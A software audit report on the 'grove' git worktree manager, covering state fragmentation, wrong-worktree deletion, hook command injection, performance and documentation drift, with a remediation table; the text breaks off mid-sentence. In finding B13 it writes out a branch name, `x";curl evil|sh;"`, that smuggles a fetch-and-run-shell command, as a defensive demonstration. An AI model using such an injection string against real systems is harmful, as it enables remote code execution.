# Grove Codebase Audit — 2026-07

Deep audit of the grove worktree manager for bugs, DRY violations, performance,
and documentation drift. Findings were produced by tracing call paths across
`cmd/`, `internal/`, and `plugins/`, and the highest-severity items were
reproduced end-to-end with a freshly built binary. Baseline: `ec7f189`
(0.9.0-dev). `go build`, `go vet`, `golangci-lint`, and the full test suite are
all green — every finding below is invisible to the current tests.

Each finding has a stable ID (e.g. `B1`) so fixes can reference it. Severity is
the user-facing impact; **[repro]** marks findings reproduced live during the
audit.

---

## Executive summary

Six root causes account for most of the serious findings:

| Root cause | Drives |
|---|---|
| **A. Born-dirty `.grove/`** — `init` never git-ignores `.grove/config.toml` and leaves the `.gitignore`/`.grove` untracked, so every worktree is "dirty" out of the box | B4, plus friction in `rm`/`to`, `fork --copy-wip` failure, false dirty status |
| **B. `FindRoot` stops at a secondary worktree's own `.grove`** | B1 (state fragmentation) and everything keyed off project root: `last`, `trim`, env/protection, hooks `MainPath` |
| **C. `Find` is first-match-wins across name/branch/basename fields** | B2 (`grove to`/`rm`/`rename` resolve to the wrong worktree — data loss) |
| **D. Four divergent post-create bootstrap paths** (CLI `new`, CLI `fork`, TUI create, TUI fork) | B7, B8 (missing symlink/hooks/docker/SetupFiles depending on path) |
| **E. Config-file hooks are only wired for create/remove events** | B6 (`pre_switch`/`post_switch`/`pre_create` recipes silently do nothing) |
| **F. Scattered `os.Exit`, raw `exec`, and repeated config loads** | consistency + minor perf findings |

**Headline (all reproduced live):**
- **B1** State fragments per-worktree — running any command from inside a worktree reads/writes a phantom `state.json`.
- **B2** `grove to zzz` / `grove rm zzz` can operate on a *different* worktree whose branch is `zzz`. Confirmed deleting the wrong worktree.
- **B3** `grove rm <name>` with **no `--force`** deletes a git-**locked** worktree and leaves corrupt registration; the code comment defending this is factually wrong.
- **B5** `grove graft --pick <5-char-sha>` panics *after* applying the cherry-pick (violates the no-`panic()` rule).
- **B9** `grove diff --stat` always reports `0 insertions / 0 deletions`.

Performance against the <500ms budget is otherwise healthy: measured `grove ls`
at 41 worktrees = 83–117ms (~44 git spawns, O(N) but parallelized); `here`
=39ms; `ps` =25ms. The one real budget threat is **P1** (unconditional network
fetch in `fork`).

---

## Remediation status

Fixed on `claude/grove-codebase-audit-f3u8kk` (each with a regression test and,
where reproducible, an end-to-end re-check):

| ID | Fix |
|----|-----|
| **B1** | `FindRoot` resolves the canonical `.grove` via git's common dir → no per-worktree state fragmentation |
| **B2** | `Find` resolves in precedence tiers (name → directory → branch); a branch can't shadow a name |
| **B3** | `Remove` gates `os.RemoveAll` on `--force` and never force-deletes a git-locked worktree |
| **B4** | `init` records machine-local artifacts in `$GIT_COMMON_DIR/info/exclude`; worktrees are no longer born dirty |
| **B5** | `graft --pick <short-sha>` no longer panics (`shortSHA` helper) |
| **B6** | `pre_switch` / `post_switch` / `pre_create` config hooks now actually run (`grove to`, `grove new`) |
| **B9** | `diff --stat` parses insertions/deletions correctly |
| **B10 / P1** | `CreateFromBranch` fetches only when the branch isn't local — fork keeps local HEAD, no needless network call |
| **B13** | Command hooks interpolate values as shell variable references — command injection via branch names is closed across all sinks: the `sh -c` builtin path AND the `docker:compose` / `docker:exec` handlers (values ride as container `-e` env, never spliced into `bash -cil`) |
| **B15** | `rename` operates on the resolved short name (state re-key + tmux rename no longer half-complete) |
| **B17** | `sync <unknown>` exits non-zero instead of a silent skip |
| **B23** | `kick web db` restarts every listed service, not just the first |
| **B26** | docker-mode `grove test` propagates the child exit code (`errors.As`) |
| **B32** | `fork` runs `hooks.toml` `post_create` actions like `grove new` |
| **D1** | `GROVE_NONINTERACTIVE` is honored — prompts take their safe path instead of hanging agents |
| **—** | `ListWIPFiles` no longer mangles the first dirty filename (`.txt` → `a.txt`) — found during this pass |
| **S1** | Release Homebrew job uses `curl -fsSL` + `pipefail` + non-empty check before hashing |
| **X1** | Formula + template license corrected to Apache-2.0 (grove repo + `homebrew-tap`) |

### Second pass (medium bugs, hooks, TUI, perf, DRY, docs)

| ID | Fix |
|----|-----|
| **B7** | `required` / `on_failure="fail"` hooks now abort the operation (stop the sequence, fail the command); opt-in, no worktree rollback, distinguished from recoverable bootstrap errors |
| **B8** | TUI delete fires the plugin pre/post-remove hooks (docker slot teardown) and kills tmux after removal — no more leaked stacks/slots |
| **B18** | `grove to <current>` short-circuits ("Already in X") instead of running the dirty gate against itself |
| **B19/B20** | `grove last` shares `grove to`'s flow (`performSwitch`) — hooks + dirty handling; `--json` no longer relocates the tmux client |
| **B21** | `grove open` uses the resolved name for tmux/state and honors agent mode |
| **B22** | root registered in state under `"root"` (its runtime key), unfreezing last-access |
| **B23** | `grove kick web db` restarts every listed service |
| **B24** | `grove trim` no longer treats unknown-age worktrees as eligible |
| **B25** | `grove doctor --all` skips the main worktree (no self-referential symlinks) |
| **B27** | `grove issues`/`grove prs` route the switch through `GROVE_CD_FILE` — no literal `cd:` on the terminal |
| **B28** | post-remove hook context carries `NewPath`/`WorktreeFull` (`rm -rf cache/{{.worktree_full}}` no longer becomes `rm -rf cache/`) |
| **B29** | `[plugins.docker.external]` field-merges (a partial `config.local.toml` no longer wipes it) |
| **B30** | tracker `runGH` reads stdout only (gh's stderr notice no longer corrupts JSON) |
| **B31** | worktree names validated on create (`../escape`, `root`, control chars rejected); validator centralized in `internal/worktree` |
| **B32** | `grove fork` runs `hooks.toml` post_create actions |
| **B33** | worktree chooser uses `strconv.Atoi` (digit-leading names like `2024-fixes` no longer misparse) |
| **B34** | bare `grove` requires a TTY stdout too (`grove > out.txt` prints help, not alt-screen escapes) |
| **B35** | `AtomicWriteFile`/`state.save` fsync before rename + dir fsync (no zero-length state.json after a crash) |
| **B36** | `.slots.json` read under the lock (no torn/empty reads) |
| **B37** | `Manager` project-name/name-pattern caches guarded by a mutex (race-free under the TUI's goroutines; verified `-race`) |
| **B38** | TUI: async refreshes keep an applied filter (return `SetItems`' cmd); `esc` clears the filter instead of quitting |
| **P4** | `grove here` lists tmux sessions once, not twice (also fixes a wrong reported session name) |
| **P5** | `grove ls --paths` uses the light listing (no N × `git status`) |
| **P7** | update-check records its attempt before fetching (no re-attempt inside the fetch window) |
| **DRY** | flock consolidated (4 files → `internal/fsutil`); default-branch detection shared between init and cleanup; `state.save` uses `AtomicWriteFile` |
| **Docs** | D1 (`GROVE_NONINTERACTIVE` — now wired), D3 (`copy_dirs`), D5 (state README), D2/D4 (docker README flags/naming), D6 (examples), plus `repair`/hook-event/spec corrections |

### Deferred (intentionally)

- **P3** (config parsed ~3× per command): threading `ctx.Config` into
  `worktree.NewManager` is a wide signature change for a sub-millisecond win
  that the <500ms budget already absorbs — not worth the risk here.
- **P6** (two un-batched state saves in the switch flow): batching across the
  intervening hook/tmux code is invasive for two cheap writes.
- **P2 tail / remaining DRY** (the 7 `git worktree list --porcelain` parsers,
  project-name-from-remote ×2, tmux switch/attach epilogue, browser-open,
  tilde-expansion, `truncate` ×3): pure cleanups with no behavior change; the
  default-branch and flock consolidations (the ones with real drift/bug risk)
  are done.
- The docker-external-mode `grove test` `env:` leak (a narrower slice of B27).

---

## Critical & High bugs

### B1 — State fragments per-worktree (root-resolution) **[repro]**
`internal/grove/project.go:63-94`, `internal/worktree/bootstrap.go:51`

`FindRoot` walks up from cwd and returns the **first** `.grove` directory it
finds. But `BootstrapWorktree` → `EnsureConfigSymlink` creates a real `.grove/`
(holding the `config.toml` symlink) in *every* worktree, and grove's own repo
commits `.grove/`. So any command run from inside a secondary worktree resolves
`ctx.ProjectRoot` to that worktree and uses `<worktree>/.grove/state.json`.

Reproduced: from `proj/`, `grove new wt1`; then from inside `proj-wt1/`,
`grove new wt2` wrote a brand-new `proj-wt1/.grove/state.json` and **wt2 never
appeared in the main state**. Blast radius: `last_worktree`, `LastAccessedAt`
(→ `trim` staleness), environment/mirror flags, protection checks, and hooks'
`MainPath` all key off the wrong root. `grove last` from inside a worktree
reports "no previous worktree". Contradicts `docs/DATA_FLOWS.md:77`
("state.json … main worktree only"). Four independent audit passes reached this
conclusion.

**Fix direction:** resolve state/config to the *main* worktree's `.grove` (via
`git rev-parse --git-common-dir` or `--show-toplevel` of the main worktree),
not the first `.grove` on the walk. `internal/hooks/config.go:170-185` already
does exactly this walk-to-common-dir for hooks.toml — generalize it.

### B2 — `Find` lets a branch name shadow another worktree's short name → wrong-worktree operations **[repro]**
`internal/worktree/worktree.go:207-224`

`Find` tests each tree against `ShortName || DisplayName || Branch || basename
|| fullName` in porcelain order and returns the first hit. A tree matching by
**branch** that is listed before the tree whose **short name** you typed wins.

Reproduced: worktree `alpha` on branch `zzz` (listed first) + worktree `zzz`
(listed second) → `grove to zzz` resolves to **alpha**. With `rm`:
`grove rm beta` on an analogous setup printed "Removed worktree 'alpha'" and
deleted the wrong directory. All of `rm`'s dirty/protected/current guards run
against the wrong tree. Backs `to`, `rm`, `rename`, `open`, `compare`, `test`,
and TUI delete. Contradicts `docs/COMMAND_SPECIFICATIONS.md:520-522`.

**Fix:** two-pass precedence — exact short/display-name match across *all* trees
first, then branch, then basename.

### B3 — `Remove` escalates to `os.RemoveAll` regardless of `--force`, destroying locked worktrees + leaving phantom registration **[repro]**
`internal/worktree/worktree.go:405-429`

`Remove` tries `git worktree remove`, then `--force`, then unconditionally
`os.RemoveAll(path)` + `git worktree prune`. The only guard before this ladder
is `rm`'s dirty pre-check — which swallows its error
(`dirtyFiles, _ := mgr.GetDirtyFiles(...)`, `rm.go:150`) and treats a failed
`git status` as clean.

Reproduced: `git worktree lock` a clean worktree containing an ignored
`secret.env`; `grove rm keep` with **no flags** deleted the directory (and the
ignored secret), printed "✓ Removed", and because `prune` skips locked entries,
`git worktree list` still shows the worktree — a phantom registration that pins
the branch and that `prune` cannot clear. `grove trim` shares this ladder via
`removeWorktreeWithHooks`.

The defending comment (`worktree.go:417-419`, "`git worktree remove --force`
refuses to delete non-empty untracked directories e.g. node_modules") is
**empirically false** — verified `remove --force` succeeds on a worktree with
untracked `node_modules/`. The fallback's only real triggers are the cases git
deliberately protects (locked trees, submodules).

**Fix:** gate the `--force`/`RemoveAll` escalation on the user's `--force` flag;
never `RemoveAll` a git-locked tree; surface git's refusal instead.

### B4 — Born-dirty `.grove/` defeats grove's own protections **[repro]**
`cmd/grove/commands/helpers.go:65-87` (`updateGitignore`), `init.go:107`

`init` writes `.gitignore` entries for `.grove/state.json`, `.bak`, `.envrc` —
but **not** `.grove/config.toml` (symlinked into every worktree) and not
`.grove/` itself; and it leaves the new `.gitignore` and `.grove/` untracked.
Result: every worktree shows `?? .grove/` immediately.

Reproduced consequences: `grove ls` shows pristine worktrees as `dirty`;
`grove rm <pristine>` demands `--force` (training users to reflexively
`--force`, which feeds B3); `grove to` refuses non-interactively (breaks
agents); `fork --copy-wip` **fails entirely** because `CreatePatch`'s
`git add --all` sweeps the `.grove/config.toml` symlink into the patch, which
then fails to apply in the fork. The suggested remedy "switch and commit" would
commit a machine-specific absolute symlink.

**Fix:** write grove's ignore entries (including `config.toml` and provisioned
symlinks) to `$GIT_COMMON_DIR/info/exclude` so they apply to every worktree and
are never committed; consider relative symlinks. Also missing from the template:
`.grove/state.lock` (grove's own repo `.gitignore:64` ignores it — they hit this).

### B5 — `grove graft --pick <short-sha>` panics after applying **[repro]**
`cmd/grove/commands/apply.go:313, 322`

`cherryPickCommits` does `cli.Success(w, "%s", c.SHA[:7])` and the conflict
path `sha[:7]`, using the SHA exactly as the user typed it. A valid 5-char
abbreviation → `panic: runtime error: slice bounds out of range [:7] with
length 5` — reproduced, and it fires *after* the cherry-pick is applied, so the
target worktree is left mutated with no summary and a stack trace. Violates the
no-`panic()` constraint. `printCommitList` (`apply.go:290-293`) already guards
the same slice; these two sites don't.

**Fix:** guard the slice (or resolve to a full SHA once in `resolveCommits`).

### B6 — `hooks.toml` `pre_switch` / `post_switch` / `pre_create` actions never execute
`internal/hooks/executor.go`, `cmd/grove/commands/to.go:152,220`

Exhaustive grep of `Executor.Execute(` in non-test code shows only
**post-create** (`bootstrap.go:123`, `tui/commands.go:176`), **pre-remove**
(`helpers.go:198`, `tui/commands.go:106`) and **post-remove**
(`helpers.go:256`). `grove to` calls only `hooks.Fire` (the Go *plugin*
registry), which does not run hooks.toml actions; nothing anywhere executes
`pre_create`/`pre_switch`/`post_switch` config actions. Every documented recipe
for those events (`docs/CONFIGURATION_REFERENCE.md:481-488, 747-791`, e.g.
`post_switch` → `bin/rails db:migrate`) silently does nothing.

**Fix:** run `Executor.Execute` for these events at the `to`/`new` sites, or
remove the events from the docs and validation.

### B7 — Config-hook `on_failure = "fail"` / `required = true` never aborts
`internal/hooks/executor.go:106-125` and all 5 call sites

Docs promise "fail — Abort the entire operation"
(`CONFIGURATION_REFERENCE.md:490-502`). The executor keeps running remaining
actions after a required failure (only records `firstRequiredErr`), and every
caller swallows the returned error (`bootstrap.go:123-128` warns and keeps the
worktree; `helpers.go:198-200` proceeds with removal). A `required = true`
`copy config/master.key` post-create hook that fails still yields a "successful"
worktree.

### B8 — TUI create/delete diverge from the CLI (missing bootstrap + plugin hooks)
`internal/tui/commands.go:46-70, 133-191`

The TUI hand-rolls worktree lifecycle instead of calling
`worktree.BootstrapWorktree`/`removeWorktreeWithHooks`, and has drifted:
- **Create** (`runPostCreateStreaming`) does state + tmux + hooks.toml but
  omits `EnsureConfigSymlink`, `SetupFiles` (copy_files/symlink_dirs), and
  `hooks.Fire(EventPostCreate)` → TUI-created worktrees get no config symlink
  and no docker/plugin post-create.
- **Delete** (`deleteWorktreeCmd`) never fires `EventPreRemove`/`EventPostRemove`
  plugin hooks → the docker plugin's agent-slot teardown + env cleanup
  (`plugins/docker/plugin.go:157-201`) is skipped, **leaking running stacks and
  `.slots.json` slots** when a worktree with an isolated stack is deleted from
  the TUI. It also kills the tmux session *before* `mgr.Remove`, so a failed
  removal has already destroyed the session (the CLI deliberately kills after).

**Fix (also resolves several DRY items):** extract create/delete/rename
orchestration into `internal/worktree` beside `BootstrapWorktree` and have both
cmd/ and tui/ call it.

### B9 — `grove diff --stat` always reports 0 insertions / 0 deletions **[repro]**
`cmd/grove/commands/compare.go:295-309`

`parseDiffStatLine` slices the wrong bounds. For
`"3 files changed, 10 insertions(+), 2 deletions(-)"` it yields
`files=3 ins=0 del=0` — reproduced live (JSON and human output). Files-changed
parses; insertions/deletions never do. No test covers it (no `compare_test.go`).

### B10 — `grove fork` silently forks the *remote's* branch, not your HEAD
`cmd/grove/commands/fork.go:188` → `internal/worktree/worktree.go:144-147`

Fork creates the local branch at HEAD, then `CreateFromBranch` always runs
`git fetch origin <branch>:<branch>`. If `origin/<branch>` exists and
fast-forwards the just-created local branch, the fetch silently moves it, so the
new worktree's HEAD is the remote's commit, not the HEAD you forked. With
`--move-wip` the WIP patch is then applied on code you never had. (Same root as
**P1**.)

### B11 — `CreatePatch` destroys the source worktree's index state
`internal/worktree/wip.go:74-92`

`git add --all` → `git diff --cached --binary` → `git reset HEAD`. Reproduced:
a staged file (`M ` ) becomes unstaged (` M`) after `fork --copy-wip`; the
carefully-constructed staged/unstaged split is flattened. If the diff step fails
between add and reset, everything is left staged. Affects `apply.go:371`,
`fork.go:174`, `overlay_fork.go:123`, `overlay_sync.go:106` — all of which
advertise "source untouched". Contradicts `docs/DATA_FLOWS.md:600`
("CreatePatch() — non-destructive").

### B12 — Config editor writes invalid TOML, breaking all config loads
`internal/tui/overlay_config.go:96-120, 232-248`

Two paths corrupt `.grove/config.toml`:
- **List fields** (`protection.protected`, `protection.immutable`) are saved as
  a bare comma-joined string → `protected = main, staging` instead of
  `["main","staging"]` → every subsequent `config.Load()` fails.
- **Docker keys** are 3-level (`plugins.docker.enabled`) but `splitKey` splits
  at the first dot only; when the file already has a `[plugins.docker]` section,
  a second `[plugins]` block is appended → duplicate-key parse error.

Once the file is invalid, `context.go:85-93` silently falls back to full
defaults for every command until it's hand-edited.

### B13 — Hook command injection via branch names (security)
`internal/hooks/executor.go:216-231`, `helpers.go:100-112`

`Interpolate` does raw string substitution of `{{.branch}}` etc. into a command
string that is then run via `exec.CommandContext("sh", "-c", command)`. Git
refnames may contain `$`, `` ` ``, `;`, `|`, `&`, quotes. The docs' own recipe
`command = "echo \"...{{.branch}}\" ..."` executes arbitrary code for a branch
named `x";curl evil|sh;"`. Grove explicitly supports fetching untrusted PRs
(`grove fetch pr/<N>`), where the attacker chooses the branch name. No
shell-quoting helper exists; the documented trust model covers the hooks file,
not interpolated values.

**Fix:** pass interpolated values as argv (not concatenated into `sh -c`), or
shell-quote every substitution.

**Resolved:** `InterpolateShell` rewrites `{{.x}}` to `${GROVE_HOOK_x}` references
with values supplied out-of-band via `ShellEnv()` — expanded after the shell
parses the command, so metacharacters can't inject. This covers three sinks:
the `sh -c` builtin command path, and the `docker:compose` / `docker:exec`
handlers, where the values are passed into the container as `-e KEY=VALUE`
(a single argv element to the docker binary, referenced as `${KEY}` inside
`bash -cil`). The reference scanner models nested shell contexts — command
substitution, arithmetic, backticks, heredocs — so the rewrite is correct as
well as safe (see the injection + context test matrices in
`internal/hooks/executor_test.go` and `plugins/docker/hook_compose_test.go`).

### B14 — `os.RemoveAll` / `CopyFile` follow a symlink at the destination → can truncate the source **[repro by syscall]**
`internal/fsutil/copy.go:30`

`CopyFile` uses `os.OpenFile(dst, O_WRONLY|O_CREATE|O_TRUNC)`, which follows a
pre-existing symlink at `dst`. If `dst` is a symlink pointing back at `src`
(e.g. a file switched from `symlink_files` to `copy_files`, then re-bootstrapped
by `grove adopt`), the source is truncated to empty with no error.
`createSymlink` (`setup.go:126-134`) Lstat-checks its destination; `CopyFile`
must do the same.

### B15 — `grove rename` operates on the raw argument, not the resolved worktree
`cmd/grove/commands/rename.go:93,111,135,168`

Unlike `rm` (which was fixed to use `wt.ShortName`), rename uses the typed
`oldName` for the protection check, the state re-key, and the tmux session name.
Renaming via a worktree's *branch* or *full directory* name half-completes:
moves the directory, then fails the state update ("not found in state"), skips
the tmux rename, and still exits 0 with "✓ Renamed". A worktree protected under
its short name is renameable via its branch name. Rename also never checks
`Environment` (rm treats env worktrees as protected).

### B16 — Local-mode docker auto start/stop reconstructs the wrong worktree path
`plugins/docker/local.go:154-169`

`OnPreSwitch`/`OnPostSwitch` call `getWorktreePath(shortName)` =
`ProjectsDir + shortName`, ignoring the naming pattern and the real location
(`Dir(repoRoot) + FullName`). `hasDockerCompose(wrongPath)` returns false, so
with `auto_start`/`auto_stop` on, `grove to` silently skips container up/down in
local mode. `ctx.WorktreePath`/`ctx.PrevWorktreePath` are populated by the
caller and ignored here.

### B17 — `grove sync <typo>` and named-target failures exit 0
`cmd/grove/commands/sync.go:82,117-123,130-133`

A named target absent from state is appended to `Skipped` and the loop
continues; nothing exits non-zero, so a misspelled env name is *quieter* than a
correct-but-non-env name. `--json` mode additionally prints the bare string
`No environment worktrees found.` (non-JSON) or text-to-stderr with `os.Exit(8)`
and no JSON document. Bad for scripted/cron env syncing.

---

## Medium bugs (selected)

| ID | Location | Summary |
|---|---|---|
| B18 | `to.go:66-135` | No "already in target" guard: `grove to <current>` re-runs the dirty gate against itself and can *refuse* a no-op switch; also mis-records `last_worktree`, breaking the A↔B toggle. **[repro]** |
| B19 | `last.go:23-96` | `grove last` is documented "equivalent to `grove to`" but fires no hooks, does no dirty handling, and never attaches outside tmux → docker keeps serving the previous worktree. |
| B20 | `last.go:77` vs `to.go:226` | `grove last --json` relocates the tmux client (switch happens before the JSON branch); `grove to --json` deliberately doesn't. |
| B21 | `open.go:128,167` | tmux session + state touch use the raw argument, not the resolved worktree → `grove open <fullname|branch>` creates a non-canonical session and a failed state touch. Ignores agent-mode/`--no-tmux` entirely (terminal takeover). |
| B22 | `init.go:202` vs runtime | Root registered in state as `"main"` but every runtime path touches `"root"` → root's `last_accessed_at` is frozen at init forever (silently log-swallowed). |
| B23 | `restart.go:17,44` | `grove kick web db` silently ignores every service after the first (`Use: "kick [service]"`, only `args[0]` used); spec says `[services...]`. |
| B24 | `clean.go:103,123` | `trim` treats unknown last-access (`DaysSince == -1`) as eligible and ages fresh worktrees by their base commit's date → a worktree made today from an old branch is "60 days" eligible. The mandatory `yes` prompt is the only backstop. |
| B25 | `doctor_worktree.go:194` | `doctor --all --fix` audits the main worktree against itself and "repairs" a missing source by creating a self-referential `ELOOP` symlink that every future `grove new` propagates. |
| B26 | `test.go:107-110` | Docker-mode exit-code propagation broken: errors are `%w`-wrapped, but the code type-asserts `*exec.ExitError` directly instead of `errors.As` → exit 2 becomes exit 1. |
| B27 | `browse.go`, `fetch.go:79`, `model.go:2497` | `grove issues`/`grove prs`/docker-mode `grove test` emit raw `cd:`/`env:` directives on stdout for commands the shell wrapper runs in passthrough → the user sees literal `cd:/path` and no directory change/export. |
| B28 | `helpers.go:245-259` | Post-remove hook context omits `NewPath`/`WorktreeFull` → `{{.new_path}}` interpolates to "" and default `working_dir="new"` resolves to grove's cwd → `rm -rf cache/{{.worktree_full}}` becomes `rm -rf cache/` in the wrong dir. |
| B29 | `config.go:374-376` | `[plugins.docker.external]` is replaced wholesale on merge (not field-merged) → a `config.local.toml` that sets one external field wipes the rest → validation fails → silent fallback to local mode with defaults. |
| B30 | `github.go:273-283` | `runGH` parses JSON from `CombinedOutput`; gh's "new release available" stderr notice corrupts the parse. `DetectRepo` already uses `Output` — the fix pattern exists in-file. |
| B31 | `new.go`/`open.go`/`fetch.go` | Create paths skip the name validation `rename` enforces: `grove new '../escape'` creates a worktree outside the parent dir; `grove new root` is unreachable and collides with the main session; names with newlines break the `cd:` protocol. |
| B32 | `fork.go:204-262` | `grove fork` never runs hooks.toml `post_create` actions and never `autoStartDocker` (unlike `new`/TUI) — a fourth divergent bootstrap. |
| B33 | `select_worktree.go:80` | Chooser `Sscanf("%d")` can't select digit-leading names (`2024-fixes` → "invalid choice 2024") and silently accepts `2abc` as entry #2. |
| B34 | `root.go:76` | TUI launch checks stdin TTY only; `grove > out.txt` from an interactive shell renders alt-screen escapes into the file. |
| B35 | `state.go:416`, `fsutil/atomic.go:31` | No `fsync` before rename anywhere; a crash after rename can leave a zero-length `state.json` that then fails to load and blocks `NewManager`. The doc comment "fsync-equivalent close" is false. |
| B36 | `slots.go:139-171`, `external.go:237-318` | `.slots.json` rewrite (Truncate+Encode) is read without the lock → torn/empty reads; the shared `.env` read-modify-write is unlocked and non-atomic → lost updates across concurrent `grove to`/`test`. |
| B37 | `naming.go:193-213` | Unsynchronized lazy caches (`m.namePattern`/`m.projectName`) on a `Manager` shared across TUI tea.Cmd goroutines → a genuine `-race` violation on cold start. |
| B38 | TUI (`model.go`) | Several state-machine bugs: dropped `list.SetItems` cmd blanks a filtered list after any async refresh (`306,370,386`); delete-last-item leaves the cursor out of range (dead keys until an arrow heals it); `esc` on an applied filter quits the whole TUI (`978`) instead of clearing it; toasts never expire when shown without a running spinner. |

Full per-file detail for the TUI, git-core, shell/tmux, and config/state findings
is preserved in the audit working notes; the table above is the actionable subset.

---

## Security

- **B13** — hook command injection via branch names (above).
- **S1** `release.yml:80` — `SHA256=$(curl -sL ... | sha256sum)` has no `-f`, no
  `pipefail`; a transient 404/HTML body hashes cleanly and publishes a broken
  Homebrew formula. Use `curl -fsSL`, `set -o pipefail`, and assert the tarball
  is non-empty.
- **S2** `internal/state/flock_unix.go:17` — `Flock(LOCK_EX)` blocks
  indefinitely; a wedged process holding `.grove/state.lock` (e.g. on NFS) hangs
  every subsequent grove command with no timeout and no message.

---

## Performance

Measured baseline is healthy (see summary). Real items:

- **P1 [high]** `internal/worktree/worktree.go:144-147` — `CreateFromBranch`
  unconditionally runs `git fetch origin <b>:<b>` (30s timeout) even for
  local-only branches. In `grove fork` the branch was created locally two lines
  earlier, so the fetch can never help and is pure latency (and correctness
  hazard **B10**). Guard with `git show-ref --verify` first. This is the single
  clearest <500ms violation.
- **P2 [med]** `internal/git/branch.go:41-77` + `clean.go:255-269` — `GetStatus`
  spawns ~4 git processes per branch, including a full
  `git worktree list --porcelain` *per branch*; trimming 10 worktrees ≈ 40+
  sequential spawns. The worktree list and `branch --merged` are loop-invariant
  — fetch once, or replace with one `for-each-ref` (as `AllBranchUpstreams`
  already demonstrates).
- **P3 [med]** `.grove/config.toml` is parsed ~3× per command (strace-verified):
  `RequireGroveContext` → `LoadFromGroveDir`, `Manager.detectProjectNameAt` raw
  read, `Manager.namePatternAt` → `LoadFromGroveDir` again. Root cause:
  `worktree.NewManager` never accepts the already-loaded `ctx.Config`. The TUI
  adds a 4th load via a *different* function (`config.Load` vs
  `LoadFromGroveDir`), which can read a different file in a worktree.
- **P4 [med]** `grove here` runs `tmux list-sessions` twice (`here.go:117-124`)
  — the basename fallback repeats the full subprocess in the common
  no-session case. `ls.go` already does the one-list-two-lookups pattern.
- **P5 [low]** `grove ls --paths` pays N parallel `git status` calls it never
  uses (`ls.go:62`, acknowledged in a comment) — `listLight` suffices.
- **P6 [low]** `grove to` does two un-batched state saves
  (`SetLastWorktree` + `TouchWorktree`) = two flock+rename cycles; the sibling
  `switchToWorktree` helper wraps the same pair in `state.Batch`.
- **P7 [med]** `internal/updatecheck` — a fetch that hangs past the 300ms wait
  budget never records the attempt (`LastCheckedAt` is written only after the
  fetcher returns), so on a host where api.github.com stalls, *every*
  interactive command pays the full 300ms forever. Persist the attempt before
  fetching, or cap the HTTP timeout below the wait budget.

---

## DRY / architecture

The highest-payoff consolidations (each also a current or latent bug source):

1. **Four post-create bootstrap paths** — `bootstrap.go:46-132` (canonical) vs
   `fork.go:204-274` vs `tui/commands.go:133-191` vs `overlay_fork.go:176-197`,
   each with a different subset of {config symlink, state, SetupFiles, plugin
   hook, hooks.toml, tmux}. Drives **B8**, **B32**. Make `BootstrapOpts` carry a
   `ParentWorktree` and route all four through it.
2. **Delete/rename orchestration** duplicated between cmd/ and TUI with drift
   (TUI skips plugin hooks; kills tmux in the wrong order). Move into
   `internal/worktree`.
3. **`git worktree list --porcelain` parsed in ~7 places** with subtle
   differences (some `TrimSpace`, some raw `CutPrefix` → CRLF drift):
   `worktree.go:544`, `naming.go:115`, `grove/project.go:217`, `git/branch.go:231`,
   `tui/overlay_checkout.go:80`, `doctor.go:268/308`, `shell/integration.go:104`
   (the last is dead). Export one parse helper.
4. **Default-branch detection ×3** with different results
   (`git/branch.go:255`, `helpers.go:50`, `tui/data.go:114`) — `init` can record
   a different default than `rm`/`trim` detect.
5. **Project-name-from-remote ×2** (`naming.go:144` config>remote>dir vs
   `helpers.go:26` remote>dir, no config) — `init` persists one, runtime uses
   the other.
6. **tmux switch/attach epilogue ×4** and **"store current session as last"
   block ×4** (`to.go`, `attach.go`, `open.go`, `helpers.go`/`tui/model.go`),
   already drifted (SwitchSession failure = warn-and-continue in one place,
   hard-abort in another).
7. **File-lock wrappers duplicated ×4 files** (`internal/state/flock_*.go` vs
   `plugins/docker/flock_*.go`, incl. the Windows `LockFileEx` plumbing) → move
   to `internal/fsutil`.
8. **Tilde expansion ×3**, **compose-filename list ×2**, **`truncate` ×3** (one
   byte-slicing, mid-rune unsafe), **commit-log `%x1E` format+parse ×2**
   (`worktree.go:492` vs `worktreeinfo/info.go:164` — the latter was written to
   subsume the former but the former is still used).
9. **`os.Getenv("GROVE_SHELL")=="1"` inlined ~7×** while
   `cli.IsShellIntegration()` exists.

**Dead code** (exported, zero prod callers): `shell.GetWorktreeNames`,
`tmux.IsCommandRunning`, `grove.ProjectRoot`, `grove.ConfigPath`,
`cli.SpinWithResult`, `output.ExitWithJSONError`, `output.ErrorSuggestions`,
`state.MigrateFromLegacy` (and it would clobber a populated state if ever
called). Plus large legacy-config-editor field set in `overlay_config.go:50-58`
and the PR/issue streaming-creation paths in the TUI.

**Consistency:** `internal/` routes git/tmux through `cmdexec` timeouts but
`plugins/docker` uses raw `exec.Command` with ad-hoc (or no) timeouts;
`RunE` handlers scatter 30+ `os.Exit` calls (skips defers, blocks in-process
testing); `hooks.go` uses the stdlib `log` package (ungated, prints raw
timestamped lines that corrupt an active TUI) instead of `internal/log`.

---

## Documentation drift

`CHANGELOG.md`, `docs/SHELL_INTEGRATION.md`, `docs/VISUAL_TESTING.md`, and
`docs/CONFIGURATION_REFERENCE.md` (aside from D1/D3 below) are accurate. The rest
carries substantial drift; highlights:

**High-impact (documented feature does not exist / actively misleads):**
- **D1** `GROVE_NONINTERACTIVE` is documented in 8+ places as "auto-accept all
  prompts", but it has **zero consumers** — it only suppresses update
  notifications. Prompts key off TTY detection, so in CI/agents they *error*,
  not auto-accept; `grove trim` still requires a piped `yes`. (README:451,
  AGENTS:28, AGENT_GUIDE:675, CONFIGURATION_REFERENCE:856, SKILL/references.)
- **D2** Phantom flags: `grove up/down --slot N` (no such flag),
  `grove trim --all` (doesn't exist), `grove fork -n` (no shorthand),
  `grove repair <name>` / `grove kick [services...]` (args ignored). Spread
  across `plugins/docker/README.md` and the skill references.
- **D3** `copy_dirs` config key is recommended in
  `CONFIGURATION_REFERENCE.md:363`, `CONTRIBUTING.md:399` (and a code error hint)
  — it doesn't exist.
- **D4** `plugins/docker/README.md`: `url_pattern` uses `{slot}` not `{port}`
  (grove allocates no ports); compose project name is `{project}-agent-{N}` not
  `{project}-{worktree}-slot-{N}`; `agent-status` sample table is wrong; slots
  are numbered from **1**, not 0.
- **D5** `internal/state/README.md` documents an entire API that doesn't exist
  (`Freeze`/`Resume`/`IsFrozen`, `~/.config/grove/state/frozen.json`) and a
  `NewManager("")` usage that errors.
- **D6** `examples/config.toml`: `[naming] pattern` example uses
  `{type}/{description}` variables that don't exist and would be rejected;
  `default_branch_action` `split`/`fork` descriptions are **reversed** vs the
  code.

**Behavioral spec drift (`COMMAND_SPECIFICATIONS.md`):** the global Exit-Codes
table (2282-2289) matches neither the code nor the doc's own per-command
